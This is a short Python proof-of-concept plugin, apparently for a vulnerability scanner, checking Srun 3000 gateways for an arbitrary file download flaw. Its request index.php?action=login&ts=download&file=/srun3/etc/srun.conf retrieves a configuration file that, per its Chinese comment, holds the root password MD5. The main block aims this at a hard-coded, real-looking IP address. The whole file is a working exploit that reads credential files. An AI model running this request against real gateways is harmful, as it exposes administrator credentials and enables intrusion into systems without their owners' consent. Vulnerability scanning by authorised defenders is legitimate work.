#!/usr/bin/env python
#-*- coding:utf-8 -*-
#配置文件下载，内有root密码md5
#ref:http://wooyun.org/bugs/wooyun-2014-067666

import urlparse
def assign(service, arg):
    if service == 'srun_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s:8800/' % (arr.scheme, arr.netloc)

def audit(arg):
    poc = arg + 'index.php?action=login&ts=download&file=/srun3/etc/srun.conf'
    code, head, res, errcode, _ = curl.curl2(poc)
    if 'username' in res and 'root_pass' in res:
        security_hole("Srun_3000 Gate vulnerable!:"+poc)

if __name__ == '__main__':
    from dummy import *
    audit(assign('srun_gateway', 'http://60.166.5.177:8800/')[1])